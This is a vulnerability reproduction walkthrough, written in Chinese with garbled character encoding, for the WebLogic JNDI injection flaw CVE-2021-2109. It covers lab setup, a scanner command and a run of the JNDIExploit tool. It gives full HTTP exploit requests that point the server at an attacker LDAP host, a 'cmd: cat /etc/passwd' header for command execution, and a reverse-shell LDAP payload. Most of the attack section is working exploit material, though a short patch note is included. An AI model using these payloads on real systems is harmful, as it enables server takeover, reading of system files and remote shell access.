# ğŸ’” Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œ

### 1ï¼‰æ¼æ´ä¿¡æ¯

|æ¼æ´åç§°	|å—å½±å“ç»„ä»¶	|æ¼æ´ç±»å‹	|æ¼æ´ç¼–å·	|
|--	|--	|--	|--	|
|Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œ	|[Weblogic](https://www.oracle.com/cn/java/weblogic/)	|è¿œç¨‹ä»£ç æ‰§è¡Œ	|CVE-2021-2109	|

|æ¼æ´ç®€ä»‹	|
|--	|
|Oracleå®˜æ–¹å‘å¸ƒäº†æ¼æ´è¡¥ä¸ï¼Œä¿®äº†åŒ…æ‹¬ CVE-2021-2109 Weblogic Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åœ¨å†…çš„å¤šä¸ªé«˜å±ä¸¥é‡æ¼æ´ã€‚CVE-2021-2109 ä¸­ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚ï¼Œé€ æˆJNDIæ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚<br><br><p>å½±å“ç‰ˆæœ¬ï¼š</p>WebLogic 10.3.6.0.0<br>WebLogic 12.1.3.0.0<br>WebLogic 12.2.1.3.0<br>WebLogic 12.2.1.4.0<br>WebLogic 14.1.1.0.0	|

|å‚è€ƒé“¾æ¥	|
|--	|
|<ol><li><a href="http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html">http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html</a></li><li><a href="https://cloud.tencent.com/developer/article/1797518">https://cloud.tencent.com/developer/article/1797518</a></li></ol>	|

|è¡¥ä¸åŠä¿®å¤æ–¹æ¡ˆ	|
|--	|
|<ol><li>å‡çº§Weblogic Serverè¿è¡Œç¯å¢ƒçš„JDKç‰ˆæœ¬</li><li>å‡çº§å®˜æ–¹å®‰å…¨è¡¥ä¸ï¼š<a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li></ol>	|

### æ¼æ´ç¯å¢ƒ

#### æ–¹æ¡ˆä¸€
ä½¿ç”¨[vulhub](https://github.com/vulhub/vulhub)æ­å»ºæ¼æ´ç¯å¢ƒ<b>ï¼ˆ14882çš„ç¯å¢ƒåŒæ ·é€‚ç”¨äºCVE-2021-2109ï¼‰</b>

```
git clone https://github.com/vulhub/vulhub
cd vulhub/weblogic/CVE-2020-14882
docker-compose up -d
```

è®¿é—®7001ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹é¡µé¢<b>ï¼ˆè¿˜éœ€è¦ç­‰å¾…ä¸€ä¼šï¼Œå› ä¸ºweblogicéœ€è¦åŠ è½½consoleæ§åˆ¶å°ï¼‰</b>

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/01.png" alt=""><figcaption></figcaption></figure>


#### æ–¹æ¡ˆäºŒ
ä½¿ç”¨[vulfocus](https://github.com/fofapro/vulfocus)æ­å»ºæ¼æ´ç¯å¢ƒ

```
docker pull vulfocus/weblogic-cve_2021_2109
docker run -itd -p 7001:7001 vulfocus/weblogic-cve_2021_2109
```

è®¿é—®æ§åˆ¶å°é¡µé¢ï¼Œè¿›è¡Œç™»å½•
* è´¦å·ï¼šweblogic
* å¯†ç ï¼šwelcome1
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/11.png" alt=""><figcaption></figcaption></figure>


### æ¼æ´å¤ç°

```
python3 vulcat.py -u <URL> -a weblogic -v cve-2021-2109

# æ³¨æ„, vulcat-v2.0.0ç‰ˆæœ¬åŠä»¥ä¸Š, åº”ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤
python3 vulcat.py -u <URL> -v cve-2021-2109
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/02.png" alt=""><figcaption></figcaption></figure>

åœ¨DNSLOGå¹³å°å¯ä»¥çœ‹åˆ°ç›¸åº”è®°å½•
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/03.png" alt=""><figcaption></figcaption></figure>

å¦‚æœæƒ³è¿›ä¸€æ­¥åˆ©ç”¨æ¼æ´ï¼Œéœ€è¦ä¸‹è½½è¾…åŠ©å·¥å…·ï¼šhttps://github.com/WhiteHSBG/JNDIExploit/
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/04.png" alt=""><figcaption></figcaption></figure>

è¿è¡ŒJNDIExploitï¼ˆéœ€è¦æå‰å®‰è£…javaç¯å¢ƒï¼‰
* ä½¿ç”¨-ié€‰é¡¹æŒ‡å®šæœ¬åœ°IP
* é»˜è®¤ç›‘å¬1389å’Œ3456ç«¯å£
```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i <IP>
```

è¿è¡ŒJNDIExploitä¹‹å
* å¤åˆ¶æ¼æ´ä¿¡æ¯ä¸­çš„Requestæ•°æ®åŒ…
* æ”¾å…¥Burpï¼Œä¿®æ”¹LDAPçš„IPåœ°å€
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/05.png" alt=""><figcaption></figcaption></figure>

```
GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1
Host: 192.168.80.132:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.80.132:7001
Origin: http://192.168.80.132:7001
```

```
ldap://192.168.80;1:1389/Basic/WeblogicEcho
```

æ­¤å¤„éœ€è¦æ³¨æ„ï¼ŒCVE-2021-2109æœ‰ä¸€ä¸ªç‰¹æ€§
* IPçš„æœ€åä¸€ä¸ª.éœ€è¦æ”¹ä¸ºåˆ†å·;
* ä¾‹å¦‚ 192.168.1.1 --> 192.168.1<b>;</b>1
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/07.png" alt=""><figcaption></figcaption></figure>

åœ¨Burpå‘é€æ•°æ®åŒ…ä¹‹åï¼Œå›åˆ°å‘½ä»¤è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†è®°å½•
* è¯´æ˜LDAPæˆåŠŸ
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/08.png" alt=""><figcaption></figcaption></figure>

```
GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1
Host: 192.168.80.132:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.80.132:7001
Origin: http://192.168.80.132:7001
cmd: cat /etc/passwd
```

æ­¤æ—¶å¦‚æœä½ æƒ³æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶è·å¾—å›æ˜¾
* åªéœ€è¦åœ¨æ•°æ®åŒ…ä¸­æ·»åŠ ä¸€ä¸ªHeaders
* cmd: ä½ çš„å‘½ä»¤
* å¦‚å›¾
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/09.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/10.png" alt=""><figcaption></figcaption></figure>


* <b>vulfocusï¼š</b>
ç”±äºvulfocusçš„é•œåƒæ— æ³•é€šè¿‡æ¼æ´ ç»•è¿‡ç™»å½•é¡µé¢è¿›åå°
æ‰€ä»¥éœ€è¦æå‰ç™»å½•ï¼Œå¹¶åœ¨æ‰«ææ—¶æ·»åŠ Cookie

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/12.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/13.png" alt=""><figcaption></figcaption></figure>

#### é¢å¤–å†…å®¹-åå¼¹shell

[JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit/)è¿˜æ”¯æŒåå¼¹shellçš„åŠŸèƒ½
* åœ¨ä¸€å°<b>Linux</b>æœºå™¨ä¸Šè¿è¡Œncatï¼Œå¦‚å›¾
* å¿…é¡»æ˜¯Linuxæœºå™¨ï¼ŒWindowsè¿è¡Œncatæ— æ³•è·å–åå¼¹å›æ¥çš„shellï¼ˆå·¥å…·ä»‹ç»æ˜¯è¿™æ ·è¯´çš„ï¼Œå¤ç°æ—¶ç»è¿‡å®éªŒä¹Ÿå‘ç°Windowsä¸è¡Œï¼‰
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/14.png" alt=""><figcaption></figcaption></figure>

ç„¶åå‘é€Payload
* æˆ‘çš„JNDIExploit.jarè¿è¡Œåœ¨192.168.80.1ï¼Œç«¯å£1389
* ncatè¿è¡Œåœ¨192.168.80.132ï¼Œç«¯å£12000

```
ldap://<ä½ çš„JNDI>/Basic/ReverseShell/<IP>/<PORT>

# ç¤ºä¾‹ï¼š
ldap://192.168.80;1:1389/Basic/ReverseShell/192.168.80.132/12000
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/15.png" alt=""><figcaption></figcaption></figure>

å›åˆ°ncatç»ˆç«¯ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è¿”å›äº†shell
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/16.png" alt=""><figcaption></figcaption></figure>
